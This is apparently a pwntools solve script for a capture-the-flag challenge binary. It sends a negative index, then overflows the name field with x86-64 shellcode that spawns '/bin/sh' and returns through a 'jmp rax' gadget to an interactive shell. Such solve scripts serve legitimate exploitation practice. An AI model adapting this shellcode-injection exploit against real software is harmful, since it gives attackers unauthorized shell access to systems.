from pwn import *

binary = '../dist/src/chall'

context.log_level = 'DEBUG'
context.binary = binary

e = ELF(binary)
r = process(binary)
# r = remote('127.0.0.1', 61008)

# rop = ROP(e)
JMP_RAX = 0x000000000040111c

r.sendlineafter(b'1. Set the player\'s rounds', b'1')
r.sendlineafter(b'Enter the number of rounds: ', b'1')
r.sendlineafter(b'Which room will the player be in?', b'-1')

shellcode = asm('''
    mov rbx, 29400045130965551
    push rbx
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 0x3b
    syscall
''')

r.sendlineafter(b'Enter the player\'s name: ', flat([
    shellcode.ljust(40, b'\00'),
    JMP_RAX
]))

r.interactive()
